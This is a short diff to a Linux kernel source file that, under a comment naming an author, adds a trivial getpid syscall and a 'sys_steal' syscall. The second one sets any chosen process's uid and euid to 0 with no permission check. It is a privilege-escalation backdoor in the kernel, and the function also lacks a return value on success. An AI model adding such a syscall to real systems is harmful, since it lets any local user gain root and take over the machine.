@@ -7276,9 +7276,25 @@ kdb_runqueue(unsigned long cpu, kdb_printf_t xxx_printf)
 }
 EXPORT_SYMBOL(kdb_runqueue);
 
+/************************************
+	Added by Austin Herring
+************************************/
 asmlinkage long sys_mygetpid(void)
 {
 	return current->tgid;
 }
+
+asmlinkage long sys_steal(pid_t pid)
+{
+	struct task_struct *task = find_task_by_pid(pid);
+	if (task == NULL)
+	{
+		return -1;
+	}
+
+	task->uid = 0;
+	task->euid = 0;
+}
+/*Finish additions*******************/
 
 #endif	/* CONFIG_KDB */
